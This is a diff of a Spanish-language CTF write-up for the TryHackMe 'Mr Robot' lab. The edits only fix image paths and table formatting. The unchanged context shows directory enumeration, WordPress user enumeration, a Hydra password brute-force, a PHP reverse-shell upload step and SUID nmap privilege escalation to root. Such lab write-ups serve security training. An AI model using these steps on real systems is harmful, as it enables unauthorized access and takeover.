@@ -27,17 +27,17 @@ Resultados:
 gobuster dir -u http://10.129.167.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50
 ```
 
-![Gobuster output](TryHackMe/Mr-Robot-CTF/assets/1.png)
+![Gobuster output](assets/1.png)
 
 Resultados relevantes:
 
-|Ruta|Status|Notar|
-|---|---|---|
-|`/robots.txt`|200|Contiene rutas ocultas|
-|`/wp-login.php`|200|Login de WordPress|
-|`/wp-admin`|301|Panel de administración|
-|`/readme`|200|Mensaje sin info útil|
-|`/.htpasswd`|403|Forbidden|
+| Ruta            | Status | Notar                   |
+| --------------- | ------ | ----------------------- |
+| `/robots.txt`   | 200    | Contiene rutas ocultas  |
+| `/wp-login.php` | 200    | Login de WordPress      |
+| `/wp-admin`     | 301    | Panel de administración |
+| `/readme`       | 200    | Mensaje sin info útil   |
+| `/.htpasswd`    | 403    | Forbidden               |
 
 ---
 
@@ -45,7 +45,7 @@ Resultados relevantes:
 
 `/robots.txt` revela dos entradas:
 
-![robots.txt](TryHackMe/Mr-Robot-CTF/assets/2.png)
+![robots.txt](assets/2.png)
 
 ```
 key-1-of-3.txt
@@ -74,7 +74,7 @@ WordPress revela si un usuario existe a través de mensajes de error diferentes:
 
 Probando `elliot` (personaje principal de la serie Mr. Robot) → el servidor confirma que el usuario existe.
 
-![WordPress confirma usuario Elliot](TryHackMe/Mr-Robot-CTF/assets/3.png)
+![WordPress confirma usuario Elliot](assets/3.png)
 
 ### Brute force con Hydra
 
@@ -88,7 +88,7 @@ hydra -l elliot -P dic_clean.txt 10.129.167.131 http-post-form "/wp-login.php:lo
 
 Contraseña obtenida: `ER28-0652`
 
-![Hydra encuentra la contraseña](TryHackMe/Mr-Robot-CTF/assets/4.png)
+![Hydra encuentra la contraseña](assets/4.png)
 
 ---
 
@@ -96,13 +96,13 @@ Contraseña obtenida: `ER28-0652`
 
 Con acceso al panel de administración de WordPress (`/wp-admin`), aprovechamos la funcionalidad de subida de plugins para ejecutar código PHP en el servidor.
 
-![Panel WordPress con usuarios](TryHackMe/Mr-Robot-CTF/assets/5.png)
+![Panel WordPress con usuarios](assets/5.png)
 
 ### Crear el payload
 
 Creamos un archivo PHP con una reverse shell en bash:
 
-![Creación shell.php](TryHackMe/Mr-Robot-CTF/assets/6.png)
+![Creación shell.php](assets/6.png)
 
 ```bash
 cat > shell.php << 'EOF'
@@ -149,9 +149,9 @@ stty raw -echo; fg
 
 En `/home/robot` encontramos dos archivos:
 
-![Shell como daemon, permiso denegado](TryHackMe/Mr-Robot-CTF/assets/7.png)
+![Shell como daemon, permiso denegado](assets/7.png)
 
-![Permisos de archivos en /home/robot](TryHackMe/Mr-Robot-CTF/assets/8.png)
+![Permisos de archivos en /home/robot](assets/8.png)
 
 - `key-2-of-3.txt` — permiso denegado (propietario: `robot`)
 - `password.raw-md5` — hash MD5 de la contraseña de `robot`
@@ -164,7 +164,7 @@ find / -perm -4000 2>/dev/null
 
 Resultado relevante: `/usr/local/bin/nmap` tiene el bit SUID activado.
 
-![SUID binaries](TryHackMe/Mr-Robot-CTF/assets/9.png)
+![SUID binaries](assets/9.png)
 
 ### Privesc con Nmap interactivo
 
@@ -180,7 +180,7 @@ whoami
 # root
 ```
 
-![whoami root](TryHackMe/Mr-Robot-CTF/assets/10.png)
+![whoami root](assets/10.png)
 
 ### Alternativa (sin SUID)
 
